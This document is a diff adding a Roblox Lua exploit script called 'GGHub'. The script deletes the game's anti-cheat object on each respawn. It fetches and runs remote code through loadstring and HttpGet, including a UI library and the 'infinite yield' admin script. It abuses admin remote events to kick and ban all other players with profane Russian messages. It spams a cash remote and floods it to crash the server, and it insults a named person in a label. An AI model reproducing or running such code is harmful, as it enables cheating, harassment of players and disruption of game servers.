@@ -1,0 +1,66 @@
+if game.Players.LocalPlayer.Character:FindFirstChild("AntiCheat") then
+game.Players.LocalPlayer.Character.AntiCheat:Destroy()
+end
+game.Players.LocalPlayer.CharacterAdded:Connect(function ()
+	wait(1)
+	if game.Players.LocalPlayer.Character:FindFirstChild("AntiCheat") then
+game.Players.LocalPlayer.Character.AntiCheat:Destroy()
+end
+end)
+
+local lib = loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptsLynX/LynX/main/UI-Library/Source.lua"))()
+
+local win = lib:Window("GGHub",Color3.fromRGB(229,49,90))
+
+local page1 = win:Page("FirstPage","7072717697")
+
+local section1 = page1:Section("Main")
+
+section1:TinyLabel("Vovik Krivoshchekov is lox")
+
+section1:Button("Kick all (Not you)",function()
+    for i,v in pairs(game.Players:GetChildren()) do
+	if v~=game.Players.LocalPlayer and v.Name~= "Nuke_Alien" and v.Name~= "T_TastyFish" then
+    local A_1 = v.Name
+local A_2 = "ЕБАТЬ ТЫ ЕБЛАН"
+local Event = game:GetService("Players").LocalPlayer.PlayerGui.admin.kick
+Event:FireServer(A_1, A_2)
+	end
+end
+end)
+
+section1:Button("Ban all (Not you)",function()
+    for i,v in pairs(game.Players:GetChildren()) do
+	if v~=game.Players.LocalPlayer and v.Name~= "Nuke_Alien" and v.Name~= "T_TastyFish" then
+    local A_1 = v.Name
+local A_2 = "ТЫ ЗАБАНЕН БЛЯТЬ Я НЕ БУДУ РАЗБАНИВАТЬ"
+local Event = game:GetService("Players").LocalPlayer.PlayerGui.admin.Ban
+Event:FireServer(A_1, A_2)
+	end
+end
+end)
+getgenv().Cash=nil
+section1:Toggle("Cash Spam",false,function(state)
+ Cash=state
+end)
+game.RunService.Stepped:Connect(function()
+if Cash then
+	wait()
+local A_1 = 0
+local Event = game:GetService("ReplicatedStorage").DropCash
+Event:FireServer(A_1)
+end
+end)
+section1:Button("Crash server",function()
+local Event = game:GetService("ReplicatedStorage").DropCash
+    for i=1,1000 do
+		Event:FireServer(0)
+	end
+end)
+
+section1:Button("Load infinite yield",function()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
+end)
+
+
+LoadPage("FirstPage")
